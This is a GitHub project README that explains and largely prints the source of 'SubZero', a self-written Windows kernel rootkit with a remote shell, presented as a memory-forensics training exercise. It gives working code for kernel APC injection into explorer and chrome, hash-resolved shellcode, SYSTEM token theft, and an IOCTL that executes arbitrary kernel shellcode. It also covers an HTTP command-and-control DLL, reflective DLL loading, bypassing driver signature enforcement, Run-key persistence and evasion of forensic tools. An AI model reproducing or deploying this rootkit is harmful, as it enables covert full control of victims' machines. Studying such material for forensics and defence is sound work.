# The SubZero Project  

SubZero is a multi-staged malware that contains a kernel-mode rootkit and a remote system shell. Part of the malware capabilities are remote kernel-mode shellcode execution and reflective DLL loading, which should grant full control over a compromised system.  
  
# Disclaimer  
  
**This repository does not promote any hacking related activity. All the information in this repository is for educational purposes only.**  
  
I take **NO** responsibility and/or liability for how you choose to use any of the source code available here. By using any of the files, you acknowledge that **you are using at your own risk**.  
  
In addition, this repository also contain a use of Microsoft's undocumented functions and structures. Using those is extremely dangerous and not recommended. **I do not promote this kind of code in any way**.  
  
# Introduction & Goal  
  
As a security researcher, I have encountered and analyzed various user-mode malwares in recent times. While some of them were more challenging than others, they were all designed with the same common ground in mind - **User-Mode**.  
My colleagues and I wanted to put our forensics skills to the test in an unknown environment like the kernel space. We started by fully [reverse-engineering an APT driver](https://github.com/DanielAvinoam/BlackEnergyV2-Driver-Reverse-Engineering) from 2008 - A pretty good start, but still far from a modern day kernel-mode threat.  
Instead of searching for a modern malicious driver to disassemble, which are extremely rare anyway, I figured it would be more beneficial to challenge my kernel programming skills and write the driver myself (After all, you should always "know your enemy")  
This driver will accompany a few other user-mode modules that together will create a complete attack vector from start to finish. The researchers will receive a [memory image](https://drive.google.com/file/d/199RgloKz4Ki6HklD5pczlNBGX-YRFd7W/view?usp=sharing) of a compromised system and will need to form an accurate status report of what happened as fast as possible.  
 
This project's main component is its driver - meaning the rest of the user-mode modules might have some compromises and will not take every scenario into account.  
The code is written in `C++ 17` and all of its features. The user-mode components designed with OOP in mind, In future versions the driver should be updated as well.  
  
  
# The Gameplan  
  
Before starting to write any code, the general flow of the attack should be decided.  
When I started this project I had a vision of a user-mode process that would be able communicate with a remote server, while a driver will cover its tracks and make it look as legitimate as possible. 
What process can be found in almost every computer today and connects to the internet regularly? **chrome.exe**.

So my initial plan went like this - load a driver. the driver will load a malicious library into a chrome process. this library will connect to a remote server. sounds easy, right? well, it turns out it is way more complicated than I thought.
Loading a user-mode library from kernel space is more than just a call to `LoadLibrary`. It requires a lot of work with undocumented functions and structures, and in a such delicate environment this far from ideal - a different approach should be taken. 

A solution driver programmers found is to execute a user-mode shellcode using an APC, similar to a malware. Many anti-virus programs work like this in order to load their DLLs into every opened process on the system.
How can a driver know when a new process is created? The kernel provides an API of callback function registration for various events, one of them is the `PsSetCreateProcessNotifyRoutineEx` function: 
```cpp
NTSTATUS PsSetCreateProcessNotifyRoutineEx(
  PCREATE_PROCESS_NOTIFY_ROUTINE_EX NotifyRoutine,
  BOOLEAN                           Remove
);
```
The `NotifyRoutine` will be invoked whenever a new process is created. In this function the driver needs to save the PID of the created process, and capture its first thread - This can be done using another callback registration function named  `PsSetCreateThreadNotifyRoutine` that works similarly to the one prior. Before a new thread executes, it calls the `TestAlert` function, that flushes its APC queue. This guarantee us that our shellcode will be executed before the process' main thread.
Prior to the APC queuing, the shellcode needs to be copied to an allocated region in the process' address space. This is only possible from the context of that process and since callback functions are executing by an arbitrary thread, another APC should be queued - this time a kernel one.
The following graph demonstrates the flow of events:

![Driver Flow](https://github.com/DanielAvinoam/TheSubZeroProject/blob/main/Images/DriverFlow.JPG "Driver Flow")

There is a crucial problem in this plan though - The malicious DLL execution is dependent on the execution of its host chrome process. We need to create a chrome process of our own and protect it from being killed. To make it look legitimate, explorer.exe's PID should be our target PID. The creation of the chrome process can be done using the same aforementioned method  (starting from an explorer.exe thread, since it is a singular process that should already run when our driver is loaded). 
For protecting this process the kernel generously offer us another callback registration function named `ObRegisterCallbacks`, which can give us a notification before an object handle create/open/duplicate operation - All there's left for us to do is to remove the `PROCESS_TERMINATE` access from the user-returned handle.
This solution is not perfect though, According to [@zodiacon](https://github.com/zodiacon)'s Windows Kernel Programming book:

> Even with this protection, clicking on a window's close button or selecting a termination option from within the application's interface would terminate the process. This is because it's being done internally by calling `ExitProcess`, Which does not involve any handles. 
This means that the protection mechanism is essentially good for processes without user interface.

This leads us to our second problem - chrome's GUI window. The suddenly-popped window will be visible to the system's user and can be closed using the window's X button. My first solution was to create the process using a `CreateProcess` function with a `CREATE_NO_WINDOW` flag sent to it. Unfortunately neither this nor using chrome's CMD arguments to hide its windows didn't work. Starting the process suspended and manipulate its memory space might work but also be loud and will defeat the whole point of having a stealthy driver in the first place. 

That's where I had an idea - what if my library's `DllMain` will never return to the caller, thus blocking the APC function and the initial call to `TestAlert`? As I suspected, this means that the initial chrome thread will not start, and the chrome window will not be created - perfect.

To fully take advantage of the kernel module, It should provide its user-mode clients exclusive access to the system resources and structures. I tried to demonstrate these capabilities with it's 3 IOCTL's - changing a process' PPID, setting a process' token to the system's one and most importantly, executing a position independent kernel shellcode.

## User-Mode

The two other user-mode components are the malware's loader and the loaded library itself.
The loader's designation is pretty straight forward - drop the malicious files to the file system, then load the driver. 
To bypass windows' driver signature enforcement I used [DSEFix](https://github.com/hfiref0x/DSEFix)'s source code, which utilizes the [WinNT/Turla](https://github.com/hfiref0x/TDL) exploit to disable the system's signature requirement variable.

>**Note**: Starting from windows 8.1 PatchGuard will detect this variable manipulation and cause a BSOD after an almost random amount of time (could be instantaneous or after hours) -  making this loading technique far from ultimate.

In order to load the driver after a system restart, the loader will add itself as a value to the registry RUN key. The driver will then monitor and prevent the deletion of this value by using a similar object notification function to the ones mentioned earlier. 

The library will fetch data from a remote server every 5 seconds using HTTP GET requests, and send back any results using HTTP POST requests. Apart from remotely removing the malware from the system without leaving any trace, the attacker would be able to send a kernel shellcode that will be passed directly to the driver and be executed, or send a DLL file that will be loaded reflectively to chrome's address space. 

The following diagram summarizes the complete attack flow:

![Complete Attack Flow](https://github.com/DanielAvinoam/TheSubZeroProject/blob/main/Images/CompleteAttackFlow.jpg "Complete Attack Flow")

**With this framework installed on a system an attacker can basically achieve anything.** 

# Code Walkthrough  

| Project                                       | Description 
| --------------------------------------------- | ------------ 
| DSEFix           			        |  [DSEFix](https://github.com/hfiref0x/DSEFix)'s source code
| KernelPISCreator 			        | Sample driver for creating and testing position independent kernel shellcode.   
| SubZeroDLL (eventlog_provider.dll)            | The library loaded into chrome.exe    
| SubZeroDriver (NdisNet.sys)   	        | The rootkit driver itself.
| SubZeroLoader (GoogleUpdateClient.exe)        | The driver loader, executes on system boot.
| SubZeroServer    			        | Python HTTP server that provides a small command line interface for making actions to the client.
| SubZeroReflectivleyLoadedDLL          	| Sample DLL that will be sent to the client from the remote server and pops a message box on load.      
| SubZeroCleanup   			        | Static library responsible for removing the malware from the system. Can be called from the loader (in case of an error) or from the DLL (in case of a remote command from the server)
| SubZeroUtils     			        |  Static library containing most of the utility classes used in the project    

## Driver 

Starting from the `DriverEntry` function, the driver initializes some usual structures like a `DeviceObject` and a symbolic link, then it register its callback and dispatch functions. This is followed by the seeking of explorer's PID, which should be present in the system's process list (`FindProcessByName` simply traverse the system's `EPROCESS` list and compare each entry's name to the requested one). In case it doesn't, the thread sleeps for 5 seconds and tries again:
```cpp
    // Search for explorer Process
    PEPROCESS explorerProcess;
    LARGE_INTEGER interval;
    interval.QuadPart = -50000000; // 5 Seconds / 100 nanoseconds - in RELATIVE time
    do {
        if (NT_SUCCESS(FindProcessByName(PARENT_PROCESS_NAME, &explorerProcess))) 
        {
            g_Globals.ExplorerPID = ::HandleToULong(::PsGetProcessId(explorerProcess));
            KdPrint((DRIVER_PREFIX "[+] explorer.exe found. PID: %d\n", g_Globals.ExplorerPID));
            break;
        }
        KdPrint((DRIVER_PREFIX "[-] explorer.exe not found. Trying again in 5 seconds\n"));
        ::KeDelayExecutionThread(KernelMode, false, &interval);
    } while (true);
    ...
```
 Next, an explorer thread should be caught. Using the `OnThreadNotify` callback function the driver checks whether the newly created thread is explorer's. Once found, the driver registers the `OnProcessNotify`function for process creation events and `InjectUsermodeShellcodeAPC` is then queued to that thread's APC queue, with a chrome-launching shellcode as its parameter:
```cpp
// Search for an explorer Thread
if (pid == g_Globals.ExplorerPID) 
{
    // Check if a launcher Thread was already found
    if (g_Globals.ExplorerLauncherThreadID != 0)
        return;

    KdPrint((DRIVER_PREFIX "[+] explorer launcher Thread catched. TID: %d\n", tid));
    g_Globals.ExplorerLauncherThreadID = tid;

    // Register for Process notifications in order to catch the ghost chrome launch
    const auto status = ::PsSetCreateProcessNotifyRoutineEx(OnProcessNotify, FALSE);

    if (!NT_SUCCESS(status)) 
    {
    KdPrint((DRIVER_PREFIX "[-] Failed to register Process callback (status=0x%08X)\n", status));
    return;
    }
    
    // Queue APC for chrome creation
    if (::ExAcquireRundownProtection(&g_Globals.RundownProtection))
    {
        ::PsLookupThreadByThreadId(ThreadId, &thread);
        if (!NT_SUCCESS(QueueAPC(thread, KernelMode, [](PVOID, PVOID, PVOID) { InjectUsermodeShellcodeAPC(LaunchChromeShellcode, ARRAYSIZE(LaunchChromeShellcode)); })))
            ::ExReleaseRundownProtection(&g_Globals.RundownProtection);
    }
    else KdPrint((DRIVER_PREFIX "[-] Error acquiring rundown protection\n"));
}
...
```
Notice the use of the global `RundownProtection` variable  - drivers can use run-down protection to safely access objects in shared system memory that are created and deleted by another kernel-mode driver. In our case, the variable is acquired before the queuing of an APC and it's the APC's job to release the object right before it terminates. 
The `DriverUnload` function might get blocked by a call to `ExWaitForRundownProtectionRelease`, which will wait for the `RundownProtection` to be released (if acquired). This is how the driver guarantee that it will not be unloaded while an APC is queued for execution, thus preventing a BSOD.

>**Note**: You might also noticed the lambda expression sent to the `QueueAPC` function. This is a trick to bypass the `KeInitializeApc` requirement for declaring a `PKNORMAL_ROUTINE` as the APC function and avoid casting its parameters to `PVOID` (which in some cases can cause some problems). 

Jumping into `InjectUsermodeShellcodeAPC`, the function receives a shellcode and its size. Since this function executes in the target process' context, it starts by allocating space equal to the shellcode's size:
```cpp
void InjectUsermodeShellcodeAPC(const UCHAR* Shellcode, SIZE_T ShellcodeSize) 
{
    KdPrint((DRIVER_PREFIX "[+] InjectUsermodeShellcodeAPC invoked\n"));
    SIZE_T pageAlligndShellcodeSize = ShellcodeSize;
    auto* const hProcess = ZwCurrentProcess();

    // Allocate Shellcode's memory
    void* address{};
    auto status = ::ZwAllocateVirtualMemory(
        hProcess,
        &address,
        0,
        &pageAlligndShellcodeSize,
        MEM_RESERVE | MEM_COMMIT,
        PAGE_EXECUTE_READ);

    if (!NT_SUCCESS(status)) 
    {
    KdPrint((DRIVER_PREFIX "[-] ZwAllocateVirtualMemory failed (0x%08X)\n", status));
    ::ExReleaseRundownProtection(&g_Globals.RundownProtection);
    return;
    }
    ...
```
In a standard code execution attack this space would be allocated with `EXECUTE_READWRITE` protection, in order to copy and then execute the code. This will alarm most anti-virus programs and expose our malware - that's where the driver comes into play. 
Initially, the space is allocated with `PAGE_EXECUTE_READ`, then an [`MDL`](https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/using-mdls) structure gets allocated and locked on that space, this time with `PAGE_READWRITE` protection. Using this structure the driver can copy the shellcode to the allocated space, while the memory `VAD` protection stays as non-writable:
```cpp
    PMDL mdl;
    PVOID mappedAddress = nullptr;
    bool successful = false;
    do {
        // Allocate MDL
        mdl = ::IoAllocateMdl(
            address,
            static_cast<ULONG>(pageAlligndShellcodeSize),
            false,
            false,
            nullptr);
        if (!mdl) 
            break;
    
        ::MmProbeAndLockPages(mdl, KernelMode, IoReadAccess);
    
        // Lock to kernel memory
        mappedAddress = ::MmMapLockedPagesSpecifyCache(
            mdl,
            KernelMode,
            MmNonCached,
            nullptr,
            false,
            NormalPagePriority);    
        if (nullptr == mappedAddress) 
            break;
    
        // Change protection
        status = ::MmProtectMdlSystemAddress(mdl, PAGE_READWRITE);
        if (NT_SUCCESS(status))
            successful = true;
    } while (false);
    ...
```
  After the shellcode gets copied, a user-mode APC is queued with the new allocation's address and the `RundownProtection` variable is released:
```cpp
    // Copy Shellcode
    __try
    {
        ::RtlCopyMemory(mappedAddress, Shellcode, ShellcodeSize);
        KdPrint((DRIVER_PREFIX "[+] Shellcode copied to (0x%p). Size: %d bytes\n", address, (int)ShellcodeSize));
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        KdPrint((DRIVER_PREFIX "[-] Error copying Shellcode to mapped address - (0x%p)\n", mappedAddress));
    }

    // Free MDL pages
    ::MmUnmapLockedPages(mappedAddress, mdl);
    ::MmUnlockPages(mdl);
    ::IoFreeMdl(mdl);
    
    QueueAPC(::KeGetCurrentThread(), UserMode, static_cast<PKNORMAL_ROUTINE>(address));
    
    // Kernel APC finished - release RP
    ::ExReleaseRundownProtection(&g_Globals.RundownProtection);
}
```
---
### The Shellcodes
Before catching the launched chrome process, let's see how the shellcode works and launches the process in the first place.
The shellcode was written with the help of [this Nytro Security](https://nytrosecurity.com/2019/06/30/writing-shellcodes-for-windows-x64/) tutorial, that covers the basics of x64 assembly and how to find the addresses of API functions at runtime.

In short, it starts by parsing the process' `PEB` structure (retrieved via the `GS` register) and finding the base address of `kernel32.dll` from the structure's lists:
```assembly
; Parse PEB and find kernel32

xor rcx, rcx 			; RCX = 0 
mov rax, [gs:rcx + 0x60] 	; RAX = PEB
mov rax, [rax + 0x18] 		; RAX = PEB->Ldr 
mov rsi, [rax + 0x20] 		; RSI = PEB->Ldr.InMemOrder
lodsq 				; RAX = Second module 
xchg rax, rsi 			; RAX = RSI, RSI = RAX 
lodsq 				; RAX = Third(kernel32) 
mov rbx, [rax + 0x20] 		; RBX = Base address
```
After parsing kernel32.dll and getting the address of its export table, the shellcode traverses through it and sends each function name to a [`djb2`](https://theartincode.stanis.me/008-djb2/) hash function. The returned hash is then compared to the fixed hash of `CreateProcessA` - this way, the shellcode avoid using exposing strings:
```assembly
; Loop through exported functions and find CreateProcessA

mov r9d, 0xaeb52e19 		; djb2(CreateProcessA)
inc rcx 			; Increment the ordinal
xor rax, rax 			; RAX = 0
mov eax, [rsi + rcx * 4]	; Get name offset
add rax, rbx 			; Get function name
push rcx 			; Push ordinal
mov rcx, rax 			; RCX = Function name pointer
mov rdx, 1 			; RDX = Char size (ASCII)
call djb2 			; Hash name
pop rcx 			; Pop ordinal back
cmp eax, r9d 			; CreateProcessA?
jnz Get_Function
xor rsi, rsi 			; RSI = 0
mov esi, [r8 + 0x24] 		; ESI = Offset ordinals
add rsi, rbx 			; RSI = Ordinals table
mov cx, [rsi + rcx * 2] 	; Number of function
xor rsi, rsi 			; RSI = 0
mov esi, [r8 + 0x1c] 		; Offset address table
add rsi, rbx 			; ESI = Address table
xor rdx, rdx 			; RDX = 0
mov edx, [rsi + rcx * 4] 	; EDX = Pointer(offset)
add rdx, rbx 			; RDX = CreateProcessA
mov rdi, rdx 			; Save CreateProcessA in RDI
```
After `CreateProcessA`'s address is found it gets called with chrome.exe's path - this path does reside in memory because `djb2` doesn't have a decoding function (It is possible to hide this text aswell, I chose not to):
```assembly
; Push the rest of CreateProcessA's parameters and call it

push r11 				; lpProcessInformation
push r10 				; lpStartupInfo
push rdx 				; bInheritHandles
push rdx				; dwCreationFlags
push rdx 				; lpEnvironment
push rdx 				; lpCurrentDirectory
xor r9, r9 				; lpThreadAttributes
xor r8, r8 				; lpProcessAttributes
lea rcx, [r15  + cmdline - get_rip]	; lpApplicationName
sub rsp, 0x20 				; Allocate stack space
call rdi 				; CreateProcessA();
add rsp, 0xD0 				; Free stack space: 0x20 (shadow space) + 0x30 (paramateres pushed) + 0x80 (structures)
```
The  shellcode that loads the DLL to the chrome process works similarly to this one except calling `LoadLibrary` instead of `CreateProcessA`.

---
Back to the driver - the shellcode gets executes by an explorer thread, causing a child chrome process to be opened. In `OnProcessNotify` the driver checks whether a new explorer child process has been created:
```cpp
void OnProcessNotify(PEPROCESS, HANDLE ProcessId, PPS_CREATE_NOTIFY_INFO CreateInfo)
{
    // Process creation only
    if (!CreateInfo) 
        return;

    auto pid = ::HandleToULong(ProcessId);
    if (g_Globals.ChromePID == 0) 
    {
        // Search for our ghost chrome
        if (::HandleToULong(CreateInfo->ParentProcessId) == g_Globals.ExplorerPID) 
        {
            KdPrint((DRIVER_PREFIX "[+] Chrome.exe catched. PID: %d\n", pid));
            g_Globals.ChromePID = pid;
        }
    }
}
```
The PID of that process is saved, and its first thread is then caught by `OnThreadNotify`. Once again, a kernel APC is queued for that thread and prior to the injection of the library-loading shellcode into it, it sets the process' token to the system's one and unregister the thread and process notification callbacks:
```cpp
    // Search for chrome's first Thread
    else if (pid == g_Globals.ChromePID)
    {
        // Check if the first Thread was already found
        if (g_Globals.ChromeFirstThreadID != 0) 
            return;
        
        KdPrint((DRIVER_PREFIX "[+] Chrome first Thread catched. TID: %d\n", tid));
        g_Globals.ChromeFirstThreadID = tid;
    
        // Queue APC for dll loading
        if (::ExAcquireRundownProtection(&g_Globals.RundownProtection)) 
        {
            ::PsLookupThreadByThreadId(ThreadId, &thread);
            if (!NT_SUCCESS(QueueAPC(thread, KernelMode, [](PVOID, PVOID, PVOID)
            {
                auto* const process = ::PsGetCurrentProcess();          // Get current process (i.e. chrome.exe)
                auto* const token = ::PsReferencePrimaryToken(process); // Get the process token
                SetTokenToSystem(process, token);                       // Replace the process token with system token
                ::ObDereferenceObject(token);                           // Dereference the process token
            
                // Thread and Process creation notification callbacks are not needed anymore
                ::PsSetCreateProcessNotifyRoutineEx(OnProcessNotify, TRUE);
                ::PsRemoveCreateThreadNotifyRoutine(OnThreadNotify);
            
                // Now inject the shellcode
                InjectUsermodeShellcodeAPC(LoadLibraryShellcode, ARRAYSIZE(LoadLibraryShellcode));     
            })))
                ::ExReleaseRundownProtection(&g_Globals.RundownProtection);
            }
        else KdPrint((DRIVER_PREFIX "[-] Error acquiring rundown protection\n"));
    }
```
Now let's take a look on the driver's IOCTLs. As stated, two of them provide a user-mode client the ability to change any process' token and parent PID. These function are relatively simple - get the address of a process `EPROCESS` structure by its PID and change a value located at a fixed position from that address. 
The IOCTL that executes a position independent shellcode is the one that really interests us. Writing a kernel-mode shellcode is a different story than a user-mode one - it's harder to debug and since the kernel modules base addresses cannot be retrieved from the `PEB`, getting the addresses of kernel functions is way more difficult.
To make my life easier, I used [@avivshabtay](https://github.com/AvivShabtay)'s template for creating a [position independent shellcode (PIS)](https://github.com/AvivShabtay/OffensiveWinAPI/tree/master/PIC). The main idea goes like this:
1. Write a function that receives either the addresses of `GetProcAddress` and `LoadLibrary` (user-mode) or `MmGetSystemRoutineAddress` (kernel-mode).
2. Use the received addresses to get the addresses of the rest of the API functions you desire.
3. Disable all compiler code enhancement and security features (either from the project's properties or disable before the function's implementation) in order to make the assembly code as pure as possible.
4. Write an injector that will allocate and copy the function, then call it in a new thread with the respective addresses as parameter.

The IOCTL handler receives a kernel PIS in its input buffer and copies it to a new kernel allocation. In case the shellcode would need to return data, another memory space is allocated in a size also received by the client.
The handler then initialize a `PisParameters` structure with the addresses of `MmGetSystemRoutineAddress` and the returned data allocation, and starts a new kernel thread that will execute the PIS with the address of the structure as its parameter:
```cpp
    auto* buffer = static_cast<SubZeroExecuteShellcodeData*>(Irp->AssociatedIrp.SystemBuffer);
    if (sizeof(SubZeroExecuteShellcodeData) + buffer->ShellcodeSize > StackLocation->Parameters.DeviceIoControl.InputBufferLength)
        return STATUS_BUFFER_TOO_SMALL;
            
    auto* const returnedDataAddress = ::ExAllocatePoolWithTag(NonPagedPool, buffer->ReturnedDataMaxSize, DRIVER_TAG);
    if (nullptr == returnedDataAddress) 
    {
        KdPrint((DRIVER_PREFIX "[-] Error allocating returned data space\n"));
        return STATUS_INSUFFICIENT_RESOURCES;
    }
    
    KernelPisParameters pisParameters;
    pisParameters.MmGetSystemRoutineAddress = MmGetSystemRoutineAddress;
    pisParameters.ReturnedDataAddress = returnedDataAddress;
    pisParameters.ReturnedDataMaxSize = buffer->ReturnedDataMaxSize;
    
    auto* const pisAddress = ::ExAllocatePoolWithTag(NonPagedPool, buffer->ShellcodeSize, DRIVER_TAG);
    if (nullptr == pisAddress) 
    {
        KdPrint((DRIVER_PREFIX "[-] Error allocating PIS space\n"));
        return STATUS_INSUFFICIENT_RESOURCES;
    }
    
    ::RtlCopyMemory(pisAddress, reinterpret_cast<PCHAR>(buffer) + buffer->ShellcodeOffset, buffer->ShellcodeSize);
 
    auto const pic = static_cast<KernelPisFunction>(pisAddress);
    
    HANDLE threadHandle;
    auto status = ::PsCreateSystemThread(
        &threadHandle, 
        THREAD_ALL_ACCESS, 
        nullptr, 
        nullptr, 
        nullptr,
        pic, 
        &pisParameters);
    if (!NT_SUCCESS(status))
        return status;
	
    PVOID threadObject;
    status = ::ObReferenceObjectByHandle(
        threadHandle,
        THREAD_ALL_ACCESS,
        nullptr,
        KernelMode,
        &threadObject,
        nullptr);
    if (!NT_SUCCESS(status))
        return status;
    
    status = ::KeWaitForSingleObject(
        threadObject,
        Executive,
        KernelMode,
        FALSE,
        nullptr);
    if (!NT_SUCCESS(status))
        return status;
	
    // Copy returned data to user buffer
    ::RtlCopyMemory(Irp->AssociatedIrp.SystemBuffer, pisParameters.ReturnedDataAddress, buffer->ReturnedDataMaxSize);
    
    // Set returned data buffer size
    Irp->IoStatus.Information = pisParameters.ReturnedDataMaxSize;
    
    // Free PIS memory
    ::ExFreePoolWithTag(returnedDataAddress, DRIVER_TAG);
    ::ExFreePoolWithTag(pisAddress, DRIVER_TAG);
    
    return STATUS_SUCCESS;
    ...
```
An example of a kernel PIS is the following function, that returns the PID of the process executing it (which will always be 4 because the PIS gets executed by a new system thread):
```cpp
#pragma runtime_checks( "", off )
#pragma optimize("", off)
#pragma code_seg(".text$AAAA")

void
__declspec(safebuffers)
__declspec(noinline)
__stdcall PisStart(PVOID StartContext)
{
    // __debugbreak(); // INT 3 for debugging
    
    if (nullptr == StartContext)
        return;
        
    PisParameters* pisParameters = (PisParameters*)StartContext;
    
    // Get MmGetSystemRoutineAddress
    pMmGetSystemRoutineAddress mmGetSystemRoutineAddress = (pMmGetSystemRoutineAddress)pisParameters->MmGetSystemRoutineAddress;
    
    if (nullptr == mmGetSystemRoutineAddress)
        return;
        
    // Function names
    WCHAR ioGetCurrentProcessName[] = { 'P','s','G','e','t','C','u','r','r','e','n','t','P','r','o','c','e','s','s','\0' };
    WCHAR psGetProcessIdName[] = { 'P','s','G','e','t','P','r','o','c','e','s','s','I','d','\0' };
    WCHAR rtlCopyMemoryName[] = { 'R','t','l','C','o','p','y','M','e','m','o','r','y','\0' };
    
    // Create UNICODE_STRING structures
    UNICODE_STRING ioGetCurrentProcessString = RTL_CONSTANT_STRING(ioGetCurrentProcessName);
    UNICODE_STRING psGetProcessIdString = RTL_CONSTANT_STRING(psGetProcessIdName);
    UNICODE_STRING rtlCopyMemoryString = RTL_CONSTANT_STRING(rtlCopyMemoryName);
    
    // Get function addresses
    pIoGetCurrentProcess ioGetCurrentProcess = (pIoGetCurrentProcess)mmGetSystemRoutineAddress(&ioGetCurrentProcessString);
    pPsGetProcessId psGetProcessId = (pPsGetProcessId)mmGetSystemRoutineAddress(&psGetProcessIdString);
    pRtlCopyMemory rtlCopyMemory = (pRtlCopyMemory)mmGetSystemRoutineAddress(&rtlCopyMemoryString);

    // Check addresses validity
    if (nullptr == ioGetCurrentProcess || nullptr == psGetProcessId || nullptr == rtlCopyMemory)
        return;
        
    // Get current process object
    PEPROCESS process = ioGetCurrentProcess();
    if (nullptr == process)
        return;
        
    // Convert to ULONG and copy to returned data address
    ULONG pid = ::HandleToULong(psGetProcessId(process));
    rtlCopyMemory(pisParameters->ReturnedDataAddress, &pid, sizeof(pid));
}
```
>**Note**: In order to avoid any strings from being located at the .data section and make the PIS read from an unknown address (since it executes from a different context), they are stored on the stack as a `WCHAR` array.

## DLL  

As mentioned earlier, in order to prevent the chrome application from start, the loaded library's `DllMain` function needs to be infinite (i.e. never return). An HTTP client object is created using [httplib](https://github.com/yhirose/cpp-httplib)'s header and a response handler function is set to be called whenever a command from the server is received. A GET request is sent to the server every 5 seconds in an endless loop and if a connection could not be established, a new object is created and the loop continues:
```cpp
BOOL APIENTRY DllMain( HMODULE, DWORD ul_reason_for_call, LPVOID)
{
    std::unique_ptr<HttpClient> httpClient(new HttpClient(IpAddress, Port, ResponseHandler));
    switch (ul_reason_for_call)
    {
        case DLL_PROCESS_ATTACH:
        try 
        {
            // Endless loop, preventing from the APC queue to empty and launch a Chrome window
            while (true) 
            {
                if (httplib::Error::Success != httpClient->FetchFromServer()) 
                {
                    // Error connecting to server - Try again in 5 seconds
                    httpClient.release();
                    httpClient.reset(new HttpClient(IpAddress, Port, ResponseHandler));
                }
                ::Sleep(SecondsToMilliseconds(SecondsBetweenFetches));
            }
        }
        catch (...) 
        {
            // Unknown exception
            SubZeroCleanup::Cleanup();
        }
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```
  
  > **Note:** As you can see, the above code (and the rest of the user-mode code in this project) uses `C++ 17` features like smart pointers, exception handling and OOP excessively.
 
The client and server have opcodes that the use to communicate with - these will be set under the `'Opcode'` header in the HTTP packets. In case no command was inputted by the attacker the server sends a `KeepAlive` opcode which is answered by an empty POST packet with the same opcode.
The 3 opcodes provided to the attacker were mentioned earlier (inject a kernel mode shellcode, reflectively load a DLL and to completely remove the malware from the system) and the result of the operation is then sent back to the server.
To makes things clearer, this is how the opcodes are defined:
```cpp
constexpr uint8_t KeepAliveOpcode = 0;

enum class ServerOpcode 
{
    InjectKernelShellcode = 1,
    LoadLibraryReflectively,
    Cleanup
};

enum class ClientOpcode 
{
    Success = 1,
    Failure
};
```
Once an opcode other than `KeepAlive` is sent from the server, the packet get parsed by the response handler function and its data is passed to an opcode-specific handler function.
The shellcode injection handler works as you expect - The DLL opens a handle to the driver and sends it the shellcode using `DeviceIoControl`. Any result from the shellcode is returned back to the server in the body of the POST response:
```cpp
    // Create SubZeroExecuteShellcodeData structure
    auto const bufferSize = DataLength + sizeof(SubZeroExecuteShellcodeData);
    
    const std::unique_ptr<char> inputBuffer(new char[bufferSize]);
    auto* const shellcodeDataStruct = reinterpret_cast<SubZeroExecuteShellcodeData*>(inputBuffer.get());
    
    shellcodeDataStruct->ShellcodeSize = static_cast<USHORT>(DataLength);
    shellcodeDataStruct->ShellcodeOffset = static_cast<USHORT>(sizeof(SubZeroExecuteShellcodeData));
    shellcodeDataStruct->ReturnedDataMaxSize = ReturnedDataSize;
    
    // Copy shellcode
    ::memcpy(inputBuffer.get() + shellcodeDataStruct->ShellcodeOffset, Data, shellcodeDataStruct->ShellcodeSize);
    
    const std::unique_ptr<char>outputBuffer(new char[shellcodeDataStruct->ReturnedDataMaxSize]);
    
    DWORD bytesReturned = 0;
    if (!::DeviceIoControl(
            deviceAutoHandle.get(),                                         // device to be queried
            IOCTL_SUBZERO_EXECUTE_SHELLCODE,                                 // operation to perform
            inputBuffer.get(), bufferSize,                                     // input buffer
            outputBuffer.get(), shellcodeDataStruct->ReturnedDataMaxSize,     // output buffer
            &bytesReturned,                                                 // # bytes returned
            nullptr))
            throw std::runtime_error(DEBUG_TEXT("[-] DeviceIoControl Failed"));
            
    if (0 < bytesReturned)
            ReturnedData->append(outputBuffer.get(), bytesReturned);
}
```
The DLL loader handler sends the executable (which similarly to the shellcode is passed in the packet's body) to `MemoryLoadLibrary` - the main function from the `ReflectiveLibraryLoader` class:
```cpp
void LoadLibraryReflectively_OpcodeHandler(const PVOID Data, const size_t DataLength)
{
    PMEMORY_MODULE hModule = ReflectiveLibraryLoader::MemoryLoadLibrary(Data, DataLength);
    if (nullptr == hModule)
        throw std::runtime_error(DEBUG_TEXT("[-] Library module object failed to initialize"));
        
    ReflectiveLibraryLoader::OverridePeStringIdentifiers(hModule);
}
```
This class is based on [Joachim Bauch's in-memory DLL loader](https://www.joachim-bauch.de/tutorials/loading-a-dll-from-memory/) and as its name suggests - it provides the attacker a DLL loader that does not require an image on the file system.
 The loading process itself works as follows:
 1. Allocate `PAGE_READWRITE` memory space and copy the PE's sections into it.
 2. Parse and relocate internal pointers (if needed).
 3. Load any dependency libraries and update the PE's IAT.
 4. Change each section memory protection to its appropriate one.
 5. Execute TLS callbacks if exists.
 6. Call the library's `DllMain`.
 
Initially, I intended to use the driver to change the DLL main allocation's `VAD` protection to `EXECUTE_WRITECOPY` and link it a `FILE_OBJECT` in order to make it look legitimate as possible. After observing a reflectively loaded library from a memory image using [Volatility Framework](https://github.com/volatilityfoundation/volatility), which is today the main tool for memory forensics (and the one my colleagues uses), it appeared it's memory regions doesn't come up on `malfind`'s results - the tool's main plugin for detecting suspicious memory allocations.
This made my life much easier, since (as expected) the `VAD` structure is undocumented and manipulating it will cause a big problem source. The only thing I did was to delete the PE's header string identifiers - the "MZ" at the first 2 bytes and the DOS header error label ("This Program cannot be run in DOS mode...")

The third opcode is for cleanup and will be overviewed later. 
 
## Loader

The loader is the first file that is dropped on a new victim. It starts by changing its directory to the chrome application directory, then it extracts the driver and DLL from its resource section and saves them at the same directory. This is followed by the DSE variable overriding and the loading of the driver:
:
```cpp
    // Save resources to file system
    try 
    {
        const PeResource driverResource(IDR_PUXY1, DRIVER_RESOURCE_NAME);
        driverResource.saveResourceToFileSystem(DRIVER_FULL_PATH);
        DEBUG_PRINT("[+] Driver extracted and saved to file system successfully");
    }
    catch (const Win32ErrorCodeException& exception) 
    {
        if (ERROR_FILE_EXISTS != exception.getErrorCode())
        {
            // Error extracting/saving resource
            DEBUG_PRINT(exception.what());
            SubZeroCleanup::Cleanup();
            return 1;
        }
    }

    ...
    
    // Disable DSE protection using DSEFix
    DSEFixMain();
    DEBUG_PRINT("[+] DSE protection disabled");
    
    // Load driver
    try 
    {
        ServiceManager serviceManager(DRIVER_NAMEW, DRIVER_FULL_PATH, SERVICE_KERNEL_DRIVER);
        serviceManager.installAndStart();
        DEBUG_PRINT("[+] Driver installed and started successfully");
    }
    catch (const Win32ErrorCodeException& exception) 
    {
